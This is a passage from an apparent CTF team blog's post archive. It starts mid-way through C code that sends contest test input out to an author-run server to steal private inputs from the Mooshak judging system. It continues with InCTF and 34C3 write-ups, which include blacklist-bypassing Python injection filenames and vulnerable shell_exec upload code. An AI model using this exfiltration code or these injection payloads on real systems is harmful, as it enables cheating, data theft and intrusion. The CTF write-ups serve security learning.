from_hex(pstr[1]) &lt;&lt; 4 | from_hex(pstr[2]); pstr += 2; &#125; &#125; else if (*pstr == '+') &#123; *pbuf++ = ' '; &#125; else &#123; *pbuf++ = *pstr; &#125; pstr++; &#125; *pbuf = '\\0'; return buf;&#125;int http_request(int argc, char **argv, char* path, char* method) &#123; struct sockaddr_in *remote; int sock; int tmpres; char *ip; char *get; char buf[BUFSIZ+1]; /*char webpage[1000];*/ char *host = HOST; char *page; int sent = 0; int htmlstart = 0; char * htmlcontent; if(argc == 1)&#123; usage(); exit(2); &#125; host = HOST; if (strcmp(\"get\", method) == 0) page = join_strings(PAGE, url_encode(path)); else page = PAGE; sock = create_tcp_socket(); ip = get_ip(host); fprintf(stderr, \"IP is %s\\n\", ip); remote = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in *)); remote-&gt;sin_family = AF_INET; tmpres = inet_pton(AF_INET, ip, (void *)(&amp;(remote-&gt;sin_addr.s_addr))); if( tmpres &lt; 0) &#123; exit(1); &#125; else if(tmpres == 0) &#123; fprintf(stderr, \"%s is not a valid IP address\\n\", ip); exit(1); &#125; remote-&gt;sin_port = htons(PORT); if(connect(sock, (struct sockaddr *)remote, sizeof(struct sockaddr)) &lt; 0)&#123; exit(1); &#125; if (strcmp(method, \"get\") == 0) get = build_get_query(host, page); else get = build_post_query(host, page, path); fprintf(stderr, \"Query is:\\n&lt;&lt;START&gt;&gt;\\n%s&lt;&lt;END&gt;&gt;\\n\", get); /*Send the query to the server*/ sent = 0; while(sent &lt; strlen(get)) &#123; tmpres = send(sock, get+sent, strlen(get)-sent, 0); if(tmpres == -1) &#123; exit(1); &#125; sent += tmpres; &#125; /*now it is time to receive the page*/ memset(buf, 0, sizeof(buf)); htmlstart = 0; while((tmpres = recv(sock, buf, BUFSIZ, 0)) &gt; 0) &#123; if(htmlstart == 0) &#123; /* Under certain conditions this will not work. * If the \\r\\n\\r\\n part is splitted into two messages * it will fail to detect the beginning of HTML content */ htmlcontent = strstr(buf, \"\\r\\n\\r\\n\"); if(htmlcontent != NULL) &#123; htmlstart = 1; htmlcontent += 4; &#125; &#125; else &#123; htmlcontent = buf; &#125; if(htmlstart) &#123; fprintf(stdout, htmlcontent); &#125; memset(buf, 0, tmpres); &#125; free(get); free(remote); free(ip); close(sock); return 0;&#125;void usage() &#123; fprintf(stderr, \"USAGE: htmlget host [page]\\n\\\\thost: the website hostname. ex: coding.debuntu.org\\n\\\\tpage: the page to retrieve. ex: index.html, default: /\\n\");&#125; int create_tcp_socket() &#123; int sock; if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) &#123; exit(1); &#125; return sock;&#125; char *get_ip(char *host) &#123; struct hostent *hent; int iplen = 15; /*XXX.XXX.XXX.XXX*/ char *ip = (char *)malloc(iplen+1); memset(ip, 0, iplen+1); if((hent = gethostbyname(host)) == NULL) &#123; exit(1); &#125; if(inet_ntop(AF_INET, (void *)hent-&gt;h_addr_list[0], ip, iplen) == NULL) &#123; exit(1); &#125; return ip;&#125; char *build_get_query(char *host, char *page) &#123; char *query; char *getpage = page; char *tpl = \"GET /%s HTTP/1.0\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\n\\r\\n\"; if(getpage[0] == '/') &#123; getpage = getpage + 1; fprintf(stderr,\"Removing leading \\\"/\\\", converting %s to %s\\n\", page, getpage); &#125; /* -5 is to consider the %s %s %s in tpl and the ending \\0 */ query = (char *)malloc(strlen(host)+strlen(getpage)+strlen(USERAGENT)+strlen(tpl)-5); sprintf(query, tpl, getpage, host, USERAGENT); return query;&#125;char *build_post_query(char *host, char *page, char *post_data) &#123; char *query; char *getpage = page; char* url_encoded = url_encode(post_data); int length_data = strlen(url_encoded)+1; char *tpl = \"POST /%s HTTP/1.0\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: %d\\r\\n\\r\\nfield1=%s\\r\\n\"; if(getpage[0] == '/') &#123; getpage = getpage + 1; fprintf(stderr,\"Removing leading \\\"/\\\", converting %s to %s\\n\", page, getpage); &#125; /* -5 is to consider the %s %s %s in tpl and the ending \\0 */ query = (char *)malloc(strlen(host)+strlen(getpage)+strlen(USERAGENT)+ strlen(tpl) + strlen(url_encoded) + 33 - 7); sprintf(query, tpl, getpage, host, USERAGENT, length_data+1, url_encoded); return query;&#125;char *join_strings(char *one, char *two) &#123; char *tpl = \"%s%s\"; char *query; query = (char *)malloc(strlen(one)+strlen(two)+1); sprintf(query, tpl, one, two); return query;&#125; And the php file (named as wtf.php in this example) 12345&lt;?phpif( isset($_POST['field1']) ) &#123; file_put_contents(\"input.txt\", urldecode($_POST['field1']));&#125;?&gt; As you can see above this is just a php script which writes the output from POST parameter into a file named input.txt that you need to create on your server too.So lets test this: 123456789101112131415161718192021222324252627282930313233$ gcc -O3 -ansi -Wall test.c -lm -o test$ cat input1 12 13 12 41 4$ ./test &lt; input./test &lt; input IP is 127.0.0.1Removing leading \"/\", converting /wtf.php to wtf.phpQuery is:&lt;&lt;START&gt;&gt;POST /wtf.php HTTP/1.0Host: 127.0.0.1User-Agent: HTMLGET 1.0Content-Type: application/x-www-form-urlencodedContent-Length: 17field1=---------------&lt;&lt;END&gt;&gt;IP is 127.0.0.1Removing leading \"/\", converting /wtf.php to wtf.phpQuery is:&lt;&lt;START&gt;&gt;POST /wtf.php HTTP/1.0Host: 127.0.0.1User-Agent: HTMLGET 1.0Content-Type: application/x-www-form-urlencodedContent-Length: 57field1=1%2b1%250a2%2b1%250a3%2b1%250a2%2b4%250a1%2b4%250a%250a&lt;&lt;END&gt;&gt; And now checking the server files: 12345678910$ pwd/var/www/html$ lsindex.cgi input.txt wtf.php$ cat input.txt 1 12 13 12 41 4 And we can see it works perfectly like this you can steal any private test input from mooshak. You may be asking if there is a way to get the output as well and the answer for now is actually no, but I’m currently researching a way to do this and I can say I’m very near to actually do it and if successful I can not only get the test outputs but the other user project submissions as well, the process to do this is an actual hack which involves privilege escalation so stay tuned for more posts. If you liked this post please follow us in twitter and consider joining our CTF team.","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"mooshak","slug":"mooshak","permalink":"https://teamrocketist.github.io/tags/mooshak/"}]},{"title":"[Reverse] InCTF 2018 - load3r","slug":"Reverse-InCTF-2018-load3r","date":"2018-10-11T03:56:04.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2018/10/11/Reverse-InCTF-2018-load3r/","link":"","permalink":"https://teamrocketist.github.io/2018/10/11/Reverse-InCTF-2018-load3r/","excerpt":"","text":"load3r100======= Difficulty level : Easy ========A basic bootloader challenge. Note: The flag format is inctf{correct_input}Note: The challenge must be run in qemu-system-i386 version 2.5.0========== Authors : b3y0nd3r, r00tus3r ========== They gave us a file named boot sector12$ file boot_try.bin boot_try.bin: DOS/MBR boot sector So lets first run the binary on an emulator named qemu: 1$ qemu-system-i386 -drive format=raw,file=boot_try.bin We can see some strings like ENTER THE FLAG and the message NOOOO when we insert an incorrect flag, this strings can help us to localize certain parts of the code while reversing, so first thing I did was to look up for this strings in IDA and search on which zones they are referenced. At first I was having some trouble with IDA because I was choosing the wrong architecture when opening the binary and IDA wasn’t able to disassemble the code, the only thing that was showing was the strings so make sure you say no to disassemble the binary in 16 bits instead of the 32 bits. After pressing no, we can already see where is the location of the strings we saw when executing the binary… So we can start taking some notes from where they start in the binary (note that since the boot sector hasn’t been loaded into memory by the bios, all the addresses are starting from 0 but when we start debugging it everything will start after 0x7c00): 123450x7c16 ENTER THE FLAG\\r\\n -&gt; calculated with 0x7c00 + 0x160x7c27 w2g1kS&lt;c7me3keeuSMg1kSk%Se&lt;=S3%/e/\\r\\n -&gt; calculated with 0x7c00 + 0x270x7c4c Yeah, that is the flag\\r\\n -&gt; calculated with 0x7c00 + 0x4c0x7c65 8 7 NOOOO\\r\\n -&gt; calculated with 0x7c00 + 0x650x7cc9 37 36 0100010011011101111111011010110101\\r\\n -&gt; calculated with 0x7c00 + 0xc9 Now we have 2 subroutines to analyse, lets start by the smallest one: IDA’s comments are very explanatory, this is a function that writes a character into the screen by performing an interruption, so we can just rename this function to print since will be easier to us to identify it when it is called again. From the image above we can already assume that the flag must have 34 characters if we insert something that doesn’t have that size we go directly to printing the wrong flag message NOOO. But if we instead give a 34 character string we go through the green flow The image above is a loop, which iterates all the characters we inserted in the program, after doing the shifts we enter into the final character modification: We need to reverse this encryption function by doing exactly the opposite: Example12345encryption function -&gt; lr_string = &apos;0&apos;flag_string = &apos;T&apos;for the first character (shift right because the 1st of lr_string is zero):chr((ord(&apos;T&apos;) &gt;&gt; 1 ) ^ 5) = / 12345reverse function -&gt; lr_string = &apos;0&apos;encryption_string = &apos;/&apos;for the first character (shift left because we are reversing it and before we shift righted):chr((ord(&apos;/&apos;) ^ 5) &lt;&lt; 1) = T Of course it’s much easier to understand all this assembly while debugging and analysing the code… the way I did it was opening gdb and running this commands inside of it, after the commands bellow is just a matter of putting more breakpoints and reading registers etc etc: 123target remote | qemu-system-i386 -S -gdb stdio -m 512 -hda boot_try.binset architecture i8086b *0x7c00 We have now everything to recover the flag it’s trivial to write a python script that recovers the flag for us: 12345678910111213import stringleft_or_right = '0100010011011101111111011010110101'enc = \"\\x77\\x32\\x67\\x31\\x6B\\x53\\x3C\\x63\\x37\\x6D\\x65\\x33\\x6B\\x65\\x65\\x75\\x53\\x4D\\x67\\x31\\x6B\\x53\\x6B\\x25\\x53\\x65\\x3C\\x3D\\x53\\x33\\x25\\x2F\\x65\\x2F\"flag = \"\"for i, c in enumerate(enc[::-1]): a = ord(c) ^ 5 if left_or_right[i] == '0': flag += chr(a &lt;&lt; 1) else: flag += chr(a &gt;&gt; 1)print 'inctf&#123;'+flag+'&#125;' Running it 12$ python final.pyinctf&#123;T0T@l+pr0+@7+7h1$+8007l04d3r+7h1n9&#125;","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"InCTF2018","slug":"InCTF2018","permalink":"https://teamrocketist.github.io/tags/InCTF2018/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"qemu","slug":"qemu","permalink":"https://teamrocketist.github.io/tags/qemu/"},{"name":"i386","slug":"i386","permalink":"https://teamrocketist.github.io/tags/i386/"},{"name":"mbr","slug":"mbr","permalink":"https://teamrocketist.github.io/tags/mbr/"},{"name":"boot_sector","slug":"boot-sector","permalink":"https://teamrocketist.github.io/tags/boot-sector/"}]},{"title":"[Forensics] InCTF 2018 - Winter Sport","slug":"Forensics-InCTF-2018-Winter-Sport","date":"2018-10-09T21:00:56.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2018/10/09/Forensics-InCTF-2018-Winter-Sport/","link":"","permalink":"https://teamrocketist.github.io/2018/10/09/Forensics-InCTF-2018-Winter-Sport/","excerpt":"","text":"Winter Sport996======= Difficulty level : Easy ========I have a friend named Jake.We were watching a football tournament on one fine chilly morning. Meanwhile Jake’s sister Susan did something mischievous which cause Jake to lose some really important data. We could only find this piece of evidence, can you recover it for him?========== Authors : cr4ck3t, stuxn3t ========== In this challenge, it is provided a zip file containing a pdf file.pdf where it is possible to find the following message. Besides this clear message, after running binwalk, we can find that there is another 7z archive. After extracting this 7z archive it is revealed another pdf, omg.pdf, containing the following characters, Well at first by opening the pdf in a text editor, we saw the composition of the pdf /ProcSet [/PDF /Text /ImageB /ImageC], saying that it contains 2 images although the pdf seemed to be corrupted, since we tried to extract the images from this pdf and there were some errors (some endstreams were missing and some other stuff regarding the pdf structure file). After we found what it seemed to be the encoding for those characters from the image above and they would translate into “What is Steganography ?Steganography is an amaz” but nothing more than that.Since we couldn’t find a clear way, we were going to fix the pdf anatomically speaking, and then we saw this. Well a bunch os spaces and tabs, just on the first 13 lines of the pdf? Due to Sublime Text (where tabs -&gt; “-“ and spaces -&gt; “.”) the idea of being another morse code related challenge, but well how could we find the spaces? what if we were using other text editor? Other options that came to our mind was Whitespace) and due to the message “What is Steganography ?Steganography is an amaz” we searched for steganography whitespace and we found Stegsnow which “is a program for concealing messages in text files by appending tabs and spaces on the end of lines, and for extracting messages from files containing hidden messages“. That was exactly what we wanted. Running it on the given omg.pdf it gave us the flag. Flag: inctf{w3lcom3_t0_7h3_w0rld_0f_whit3sp4c3}","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"steganography","slug":"steganography","permalink":"https://teamrocketist.github.io/tags/steganography/"},{"name":"whitespace_steganography","slug":"whitespace-steganography","permalink":"https://teamrocketist.github.io/tags/whitespace-steganography/"},{"name":"InCTF2018","slug":"InCTF2018","permalink":"https://teamrocketist.github.io/tags/InCTF2018/"}]},{"title":"[Web] InCTF 2018 - The Most Secure File Uploader","slug":"Web-InCTF-2018-The-Most-Secure-File-Uploader","date":"2018-10-08T00:09:56.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2018/10/08/Web-InCTF-2018-The-Most-Secure-File-Uploader/","link":"","permalink":"https://teamrocketist.github.io/2018/10/08/Web-InCTF-2018-The-Most-Secure-File-Uploader/","excerpt":"","text":"The Most Secure File Uploader100======= Difficulty level : Medium ========Somehow the codes are all messed up and it seems that it was my younger brother. He messed up my File Uploader. But I know you…You don’t look like a hacker at all…Can you fix this for me? :)link========== Authors : c3rb3ru5, Nimisha, SpyD3r ========== After a long pause we are happy to announce that we are doing CTFs again so more write ups coming soon this month :). Starting with something simple we have a web challenge where it’s hinted that we probably need to upload something malicious to the server, for the begining I decided to upload a random image without nothing special: And we can already see something interesting, we have a traceback error and we can easily identify it as being from python, the file name is being executed as python code, after some testing I noticed that a lot of words were blacklisted: 1blacklisted = r\"import|os|class|subclasses|mro|request|args|eval|if|for|\\%|subprocess|file|open|popen|builtins|\\+|compile|execfile|from_pyfile|config|local|\\`|\\||\\&amp;|\\;|\\&#123;|\\&#125;\" As we know blacklisting is always a bad practice after testing for a while I noticed that globals() wasn’t being blocked and from globals we can easily can get the builtin function from python : 123456$ python -c \"print globals()\"&#123;'__builtins__': &lt;module '__builtin__' (built-in)&gt;, '__name__': '__main__', '__doc__': None, '__package__': None&#125;$ python -c \"print globals().values()[0]\"&lt;module '__builtin__' (built-in)&gt;$ python -c \"print dir(globals().values()[0])\"['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BufferError', 'BytesWarning', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'NameError', 'None', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'ReferenceError', 'RuntimeError', 'RuntimeWarning', 'StandardError', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '__debug__', '__doc__', '__import__', '__name__', '__package__', 'abs', 'all', 'any', 'apply', 'basestring', 'bin', 'bool', 'buffer', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'cmp', 'coerce', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'execfile', 'exit', 'file', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'intern', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'long', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'raw_input', 'reduce', 'reload', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'unichr', 'unicode', 'vars', 'xrange', 'zip'] But we run into a problem now a lot of words are blacklisted and there is an interesting builtin function we can use to list the files in the current directory , the problem is both import and os keywords are blacklisted so how do we bypass this? My solution was to find a way to execute function and import modules (dict[‘function’]) with strings and why strings? Because we can bypass this keywords by just using some kind of encoding in my case I choose to use base64: 12345$ python -c \"print globals().values()[0].__dict__['__import__']('os')\" # gets caught by the filter&lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt;python -c \"print globals().values()[0].__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))\" #bypasses the filter&lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt; Another thing we need to worry about is about the extension of the file, the filename needs to end in a valid image format like .jpg, this will cause an error because python methods don’t have a valid attribute named .jpg for example but we can easily bypass this by using a python comment #.jpg: 12python -c \"print globals().values()[0].__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))#.jpg\" &lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt; Now if we want to list the current directory with os.listdir(‘.’) we just need to complete our script: We now know that there is a file with the name of flag we just need to read it with open and read() : 12print globals().values()[0].__dict__['open']('flag','r').read()#.jpgprint globals().values()[0].__dict__['b3Blbg=='.decode('base64')]('flag','r').read()#.jpg And there it was the flag, and I managed to get the source code of the php file so here is an extra: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?php$target_dir = \"uploads/\";$target_file = $target_dir . basename($_FILES[\"fileToUpload\"][\"name\"]);$uploadOk = 1;$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));$blacklist = \"import|os|class|subclasses|mro|request|args|eval|if|for|\\%|subprocess|file|open|popen|builtins|\\+|compile|execfile|from_pyfile|config|local|\\`|\\||\\&amp;|\\;|\\&#123;|\\&#125;\";if(!$_FILES[\"fileToUpload\"][\"name\"])&#123; die(\"PLEASE UPLOAD SOMETHING\");&#125;// Check if image file is a actual image or fake imageif(isset($_POST[\"submit\"])) &#123; $check = getimagesize($_FILES[\"fileToUpload\"][\"tmp_name\"]); if($check !== false) &#123; echo \"File is an image - \" . $check[\"mime\"] . \"&lt;br--&gt;\"; $uploadOk = 1; &#125; else &#123; echo \"File is not an image.\" . \"&lt;br&gt;\"; $uploadOk = 0; &#125;&#125;// Check file sizeif ($_FILES[\"fileToUpload\"][\"size\"] &gt; 500000) &#123; echo \"Sorry, your file is too large.\" . \"&lt;br&gt;\"; $uploadOk = 0;&#125;// Allow certain file formatsif($imageFileType != \"jpg\" &amp;&amp; $imageFileType &amp;&amp; \"png\" &amp;&amp; $imageFileType != \"jpeg\"&amp;&amp; $imageFileType != \"gif\" ) &#123; echo \"Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed.\" . \"&lt;br&gt;\"; $uploadOk = 0;&#125;// Check if $uploadOk is set to 0 by an errorif ($uploadOk == 0) &#123; echo \"Sorry, your file was not uploaded.\" . \"&lt;br&gt;\"; exit();&#125;// if everything is ok, try to upload fileif (preg_match(\"/$blacklist/i\", $_FILES[\"fileToUpload\"][\"name\"]))&#123; echo \"&lt;br&gt;Filename: \".$_FILES[\"fileToUpload\"][\"name\"].\"&lt;br&gt;&lt;br&gt;\"; die(\"I think its called blacklisting...!\");&#125;echo \"The file: \". basename( $_FILES[\"fileToUpload\"][\"name\"]). \" has been uploaded.\" . \"&lt;br&gt;\";echo \"File: \" . $_FILES[\"fileToUpload\"][\"name\"] . \"&lt;br&gt;\";echo \"Size: \" . $_FILES[\"fileToUpload\"][\"size\"] . \"&lt;br&gt;\";echo \"Type: \" . $_FILES[\"fileToUpload\"][\"type\"] . \"&lt;br&gt;\";echo \"&lt;br&gt;&lt;br&gt;&lt;br&gt;\";echo $name = urldecode($_FILES[\"fileToUpload\"][\"name\"]);echo \"&lt;br&gt;&lt;br&gt;&lt;br&gt;\";echo shell_exec(\"python -c \\\"\" . $name . \"\\\" 2&gt;&amp;1\");?&gt;","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"InCTF2018","slug":"InCTF2018","permalink":"https://teamrocketist.github.io/tags/InCTF2018/"},{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"pyjail","slug":"pyjail","permalink":"https://teamrocketist.github.io/tags/pyjail/"},{"name":"python_sandbox","slug":"python-sandbox","permalink":"https://teamrocketist.github.io/tags/python-sandbox/"}]},{"title":"[Reverse] 34C3ctf - m0rph","slug":"Reverse-34C3ctf-m0rph","date":"2017-12-30T00:07:22.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/12/30/Reverse-34C3ctf-m0rph/","link":"","permalink":"https://teamrocketist.github.io/2017/12/30/Reverse-34C3ctf-m0rph/","excerpt":"","text":"m0rph 49 Solves: 163To get you started :)files: Linkdifficulty: easy Opening the binary in IDA: As we can see mmap is being used to reserve a place in memory with read,write and execute permissions, by knowing this we can expect that some shellcode is going to be inserted in some place in the memory and then executed. The shellcode is being inserted in the final for loop that you can see in the image above, but in each run, this mini shellcodes are going to be executed in a different order because they are being randomized in sub_55C4675D7987. This isn’t a problem we can use radare2 to check this shellcode on each loop iteration, by reading the shellcode we can check which byte is being checked in cmp instructions. The commands I used in radare2 to this were the following: 12345678ood argv1 # starts the binary with argv1pdf @ main # disassembles the main functiondb # setting breakpointsdc # continuepd 4@rax # to disassemble the first 4 instructions before call raxdr # show register valuesdr rax # show a specific value of a register in this case raxdr rax = 0x1 # modifies the value of rax in this case to 0x1 Since pie protection is enabled the addresses to breakpoint will be different in each debug running attempt, to circumvent this in my python script I’m disassembling the main function and parsing the code to get this addresses. Since we don’t know the flag yet on each byte checks we can’t forget to update in the argv1 string the correct bytes otherwise (before cmp), if the check goes incorrect the shellcode will call syscall_exit and terminates. My radare2 script to do this (r2pipe): 123456789101112131415161718192021222324252627282930313233343536import r2pipeimport redef write_lowest_byte(n, b): return n &amp; 0xffffffffffffff00 | bflag_begin = '34C3_'flag = flag_begin + 'A'*(23-len(flag_begin))r2=r2pipe.open('./morph',flags=['-2'])r2.cmd(\"ood %s\" % flag)r2.cmd(\"aa\")source_main = r2.cmd(\"pdf @ main\")bp_lines = [line for line in source_main.split('\\n') if \"call rax\" in line]bps = [re.search(r'0x[0-9a-f]+', bp).group(0) for bp in bp_lines]for bp in bps: r2.cmd('db %s'%bp)r2.cmd(\"dc\")flag_bytes = []for i in range(23): code = r2.cmd(\"pd 4@rax\") line = code.split('\\n')[-1] finds = re.findall(r'0x[0-9a-f]+', line) cmp_b = finds[0] flag_byte = finds[1] t = (int(flag_byte,16), int(r2.cmd(\"dr rax\"), 16)) flag_bytes.append(t) r2.cmd(\"db %s\" % cmp_b) r2.cmd(\"dc\") address = int(r2.cmd(\"dr rax\"), 16) r2.cmd(\"dr rax = %s\" % hex(write_lowest_byte(address, int(flag_byte,16)))) r2.cmd(\"dc\")flag = ''flag_bytes = sorted(flag_bytes,key=lambda tup: tup[1])print ''.join([chr(t[0]) for t in flag_bytes])r2.quit() If you putted a breakpoint before the end, you could check the full shellcode with radare2 by using this: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142[0x55769853cb95]&gt; pd 140@ 0x7f3e3151b000 ;-- rcx: ;-- rsi: 0x7f3e3151b000 56 push rsi 0x7f3e3151b001 52 push rdx 0x7f3e3151b002 8a07 mov al, byte [rdi] 0x7f3e3151b004 3c33 cmp al, 0x33 ; &apos;3&apos; ; 51 ,=&lt; 0x7f3e3151b006 0f85db020000 jne 0x7f3e3151b2e7 ,==&lt; 0x7f3e3151b00c e9b8020000 jmp 0x7f3e3151b2c9 || 0x7f3e3151b011 56 push rsi || 0x7f3e3151b012 52 push rdx || 0x7f3e3151b013 8a07 mov al, byte [rdi] || 0x7f3e3151b015 3c34 cmp al, 0x34 ; &apos;4&apos; ; 52 ,===&lt; 0x7f3e3151b017 0f85ca020000 jne 0x7f3e3151b2e7 ,====&lt; 0x7f3e3151b01d e9a7020000 jmp 0x7f3e3151b2c9 |||| 0x7f3e3151b022 56 push rsi |||| 0x7f3e3151b023 52 push rdx |||| 0x7f3e3151b024 8a07 mov al, byte [rdi] |||| 0x7f3e3151b026 3c43 cmp al, 0x43 ; &apos;C&apos; ; 67 ,=====&lt; 0x7f3e3151b028 0f85b9020000 jne 0x7f3e3151b2e7 ,======&lt; 0x7f3e3151b02e e996020000 jmp 0x7f3e3151b2c9 |||||| 0x7f3e3151b033 56 push rsi |||||| 0x7f3e3151b034 52 push rdx |||||| 0x7f3e3151b035 8a07 mov al, byte [rdi] |||||| 0x7f3e3151b037 3c33 cmp al, 0x33 ; &apos;3&apos; ; 51 ,=======&lt; 0x7f3e3151b039 0f85a8020000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b03f e985020000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b044 56 push rsi ||||||| 0x7f3e3151b045 52 push rdx ||||||| 0x7f3e3151b046 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b048 3c5f cmp al, 0x5f ; &apos;_&apos; ; 95 ========&lt; 0x7f3e3151b04a 0f8597020000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b050 e974020000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b055 56 push rsi ||||||| 0x7f3e3151b056 52 push rdx ||||||| 0x7f3e3151b057 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b059 3c4d cmp al, 0x4d ; &apos;M&apos; ; 77 ========&lt; 0x7f3e3151b05b 0f8586020000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b061 e963020000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b066 56 push rsi ||||||| 0x7f3e3151b067 52 push rdx ||||||| 0x7f3e3151b068 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b06a 3c31 cmp al, 0x31 ; &apos;1&apos; ; 49 ========&lt; 0x7f3e3151b06c 0f8575020000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b072 e952020000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b077 56 push rsi ||||||| 0x7f3e3151b078 52 push rdx ||||||| 0x7f3e3151b079 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b07b 3c47 cmp al, 0x47 ; &apos;G&apos; ; 71 ========&lt; 0x7f3e3151b07d 0f8564020000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b083 e941020000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b088 56 push rsi ||||||| 0x7f3e3151b089 52 push rdx ||||||| 0x7f3e3151b08a 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b08c 3c48 cmp al, 0x48 ; &apos;H&apos; ; 72 ========&lt; 0x7f3e3151b08e 0f8553020000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b094 e930020000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b099 56 push rsi ||||||| 0x7f3e3151b09a 52 push rdx ||||||| 0x7f3e3151b09b 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b09d 3c54 cmp al, 0x54 ; &apos;T&apos; ; 84 ========&lt; 0x7f3e3151b09f 0f8542020000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b0a5 e91f020000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b0aa 56 push rsi ||||||| 0x7f3e3151b0ab 52 push rdx ||||||| 0x7f3e3151b0ac 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b0ae 3c59 cmp al, 0x59 ; &apos;Y&apos; ; 89 ========&lt; 0x7f3e3151b0b0 0f8531020000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b0b6 e90e020000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b0bb 56 push rsi ||||||| 0x7f3e3151b0bc 52 push rdx ||||||| 0x7f3e3151b0bd 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b0bf 3c5f cmp al, 0x5f ; &apos;_&apos; ; 95 ========&lt; 0x7f3e3151b0c1 0f8520020000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b0c7 e9fd010000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b0cc 56 push rsi ||||||| 0x7f3e3151b0cd 52 push rdx ||||||| 0x7f3e3151b0ce 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b0d0 3c4d cmp al, 0x4d ; &apos;M&apos; ; 77 ========&lt; 0x7f3e3151b0d2 0f850f020000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b0d8 e9ec010000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b0dd 56 push rsi ||||||| 0x7f3e3151b0de 52 push rdx ||||||| 0x7f3e3151b0df 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b0e1 3c30 cmp al, 0x30 ; &apos;0&apos; ; 48 ========&lt; 0x7f3e3151b0e3 0f85fe010000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b0e9 e9db010000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b0ee 56 push rsi ||||||| 0x7f3e3151b0ef 52 push rdx ||||||| 0x7f3e3151b0f0 8a07 mov al, byte [rdi] 